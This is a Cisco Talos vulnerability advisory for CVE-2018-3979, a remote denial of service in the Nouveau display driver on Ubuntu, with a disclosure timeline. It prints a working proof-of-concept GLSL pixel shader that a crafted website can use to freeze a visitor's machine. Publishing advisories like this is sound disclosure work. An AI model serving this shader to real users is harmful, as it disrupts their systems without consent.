=== Content from talosintelligence.com_3013c1d1_20250125_101733.html ===


* [Cisco Login](/users/auth/saml)

* [Intelligence Center](/reputation)

  + [# Intelligence Center](/reputation)
  + BACK
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* [Vulnerability Research](/vulnerability_info)

  + [# Vulnerability Research](/vulnerability_info)
  + BACK
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* [Incident Response](/incident_response)

  + [# Incident Response](/incident_response)
  + BACK
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* [Blog](https://blog.talosintelligence.com)
* [Support](https://support.talosintelligence.com)

More

* Security Resources

  # Security Resources

  + BACK
  Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* Media

  # Media

  + BACK
  Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* Company

  # Company

  + BACK
  Company
  + [About Talos](/about)
  + [Careers](/careers)

* Under Attack?
* [Cisco Login](/users/auth/saml)

## Contact Cisco Talos Incident Response

×

Close

This form is for Incident Response service inquiries only, including emergency network security needs.

For reputation or categorization inquiries, visit the [Talos Support site](/support).
For emergency DDoS mitigation assistance, please contact the [Cisco Secure DDoS Protection Team](https://www.cisco.com/c/en/us/products/collateral/security/ddos-emergency-attack-mitigation-aag.pdf).

Name

Company (optional)

Email address

Phone number

Preferred communication:

Email

Phone

What Incident Response Service are you interested in?
General Talos IR services and retainer information
Emergency Response
IR Plan
IR Playbooks
IR Readiness Assessment
Tabletop Exercises
Compromise Assessment
Threat Hunting
Cyber Range Training
Intelligence on Demand

Please provide as much detail as possible so we can best address your needs

I acknowledge that this is an inquiry for Incident Response services and that any other use of this form will not receive a response.

Send Email
Cancel

# Talos Vulnerability Report

### TALOS-2018-0647

## Nouveau Display Driver Remote Denial of Service

##### March 26, 2019

##### CVE Number

CVE-2018-3979

### Summary

A remote denial-of-service vulnerability exists in the way the Nouveau display driver (the default Ubuntu Nvidia display driver) handles GPU shader execution. A specially crafted pixel shader can cause remote denial-of-service issues. An attacker can provide a specially crafted website to trigger this vulnerability. This vulnerability can be triggered remotely after the user visits a malformed website. No further user interaction is required.

### Tested Versions

Ubuntu 18.04 LTS (linux 4.15.0-29-generic x86\_64), Nouveau Display Driver NV117 (vermagic: 4.15.0-29-generic SMP mod\_unload)

### Product URLs

<https://nouveau.freedesktop.org/wiki/>
<http://ubuntu.com>

### CVSSv3 Score

7.4 - AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:N/A:H

### CWE

CWE-400: Uncontrolled Resource Consumption

### Details

This vulnerability can be triggered by a user visiting a specifically crafted website. Such an attack can render the entire machine frozen until the machine reboots (in most cases a manual machine reboot is required). We were able to launch this attack remotely using popular browsers on the client’s end, such as Google Chrome and Mozilla Firefox.

Nouveau is a free and open-source graphics device driver for Nvidia video cards and the Tegra family of systems on a chip written by independent software engineers with minor help from Nvidia employees. The project’s goal is to create an open-source driver by reverse engineering Nvidia’s proprietary Linux drivers. It is managed by the X.Org Foundation, hosted by freedesktop.org, and is distributed as part of Mesa 3D. Since the Ubuntu 10.04 LTS (Lucid Lynx), Ubuntu decided to switch the Nvidia graphics driver to Nouveau by default [1].

The following shader is triggering the denial-of-service vulnerability on an Ubuntu machine:

```
#ifdef GL_ES
precision mediump float;
#endif

uniform float time;

#define LINEAR_INTERPOLATION

vec3 func4(float index) {
    index = mod(index * index, 250.0);
    vec3 xout = vec3(index, index, index);
    return xout;

}

float func3(vec3 position) {

    vec3 var_1 = floor(position);

    float var_dummy[8];
    for (float z=0.0; z<2.0; z++) {
        for (float y=0.0; y<2.0; y++) {
            for (float x=0.0; x<2.0; x++) {
                vec3 var_pos = var_1 + vec3(x, y, z);
                vec3 var_vector = func4(var_pos.x);
                var_dummy[int((z*4.0) + (y*2.0) + x)] = dot(var_vector, var_vector);
            }
        }
    }

    return var_dummy[0];
}

const float var_2 = 0.24;

float func2(float var_2) {
  if (time < 1.0) return var_2;
  else return -1.0;
}

void main() {
  float t = func2(var_2);
  vec4 color;

  if (t == -1.0) {
      vec3 noisePoint = vec3(time*0.01, time*0.2, time*0.3);
      vec4 color = vec4(0.1, 0.1, 0.1, 1.0);
      color.rgb *= 1.0 - func3(noisePoint);
      gl_FragColor = color;
      return ;
  }
  gl_FragColor = color;

```

The analysis of this bug mostly relies on assumptions since there is no kernel crash (crash dump information) to investigate. The Ubuntu graphics interface just freezes. We assume that the GPU shader is consuming too many resources and eventually renders the machine unusable. At this point, a watchdog mechanism should step in, but for some unknown reason, it doesn’t. The same vulnerability does not trigger on other systems (for example Windows) and even on Ubuntu Linux itself. Proprietary Nvidia drivers are not vulnerable to this attack.

### Timeline

2018-08-03 - Vendor Disclosure

2018-09-26 - 2nd Vendor follow up

2018-09-28 - Vendor acknowledged; Copy of report emailed to point of contact assigned

2018-10-11 - 3rd copy of report sent; vendor claimed issues with receiving file via email

2018-10-15 - 4th copy of report sent

2018-11-05 - Vendor advised report under review

2018-12-10 - Vendor advised “issues are known already”

2019-01-10 - 90+ day follow up (125 days)

2019-03-26 - Public Release

##### Credit

Discovered by Piotr Bania of Cisco Talos.

---

[Vulnerability Reports](/vulnerability_reports) [Next Report

TALOS-2019-0785](/vulnerability_reports/TALOS-2019-0785) [Previous Report

TALOS-2018-0640](/vulnerability_reports/TALOS-2018-0640)

* + ###### [Intelligence Center](/reputation)
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* + ###### [Vulnerability Research](/vulnerability_info)
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* + ###### [Incident Response](/incident_response)
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* + ###### Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* + ###### Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* + ###### Support
  + [Support Documentation](https://support.talosintelligence.com)
* + ###### Company
  + [About Talos](/about)
  + [Careers](/careers)
  + [Cisco Security](https://www.cisco.com/c/en/us/products/security/product-listing.html)

###### Follow us

[![Cisco](/assets/logo_cisco_white-d87b7f7d3152ad412e48aad924a972cc5b802b7a53cb56b0792a4456c9b7b3a5.svg)](http://tools.cisco.com/security/center/home.x)

©
2025
Cisco Systems, Inc. and/or its affiliates. All rights
reserved. View our
[Privacy Policy.](http://www.cisco.com/web/siteassets/legal/privacy_full.html)


